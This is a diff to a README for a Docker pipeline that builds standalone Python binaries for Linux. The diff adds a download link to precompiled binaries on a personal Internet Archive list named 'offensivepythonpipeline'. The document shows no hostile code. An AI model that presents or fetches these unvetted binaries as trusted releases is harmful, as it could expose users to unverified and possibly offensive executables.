@@ -43,3 +43,10 @@ docker run --rm --platform linux/amd64 -p 5001:5000 pybuilder
 ## Output
 
 The pipeline generates standalone Python binaries that can be deployed on Linux systems with **glibc 2.28** or newer, minimizing runtime dependencies on the target host.
+  
+## Downloads
+
+Precompiled standalone binaries are available from the Internet Archive.
+
+**Download:**  
+https://archive.org/details/@keith358/lists/1/offensivepythonpipeline
